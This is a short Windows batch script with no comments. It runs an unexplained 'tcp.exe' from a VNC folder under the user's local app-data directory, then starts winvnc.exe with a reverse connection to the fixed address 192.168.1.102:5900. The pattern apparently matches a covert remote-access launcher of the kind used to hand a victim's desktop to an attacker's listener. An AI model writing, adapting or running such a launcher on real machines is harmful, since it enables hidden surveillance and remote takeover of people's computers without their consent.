@echo off
cd /d "%localappdata%\VNC"
tcp.exe
timeout /t 1 >nul
winvnc.exe -connect 192.168.1.102:5900
timeout /t 1 >nul
winvnc.exe -run
exit
